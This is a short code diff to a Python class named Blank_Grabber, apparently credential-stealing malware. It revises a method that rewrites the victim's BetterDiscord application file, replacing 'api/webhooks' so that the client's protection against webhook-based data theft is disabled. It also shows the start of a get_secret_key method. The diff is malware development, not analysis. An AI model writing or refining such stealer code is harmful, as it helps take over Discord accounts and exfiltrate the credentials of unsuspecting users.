@@ -106,10 +106,10 @@ class Blank_Grabber:
         
     def bypass_better_discord(self):
         bd = os.getenv("appdata")+"/BetterDiscord/data/betterdiscord.asar"
-        with open(bd, "rt") as f:
-            content = f.read().replace("api/webhooks", "Blank-c")
-        with open(bd, 'w'): pass
-        with open(bd, "wt") as f:
+        if os.path.isfile(bd):
+            with open(bd, "r", encoding="cp437", errors="ignore") as f:
+                content = f.read().replace("api/webhooks", "Blank-c")
+        with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
             f.write(content)
             
     def get_secret_key(self):
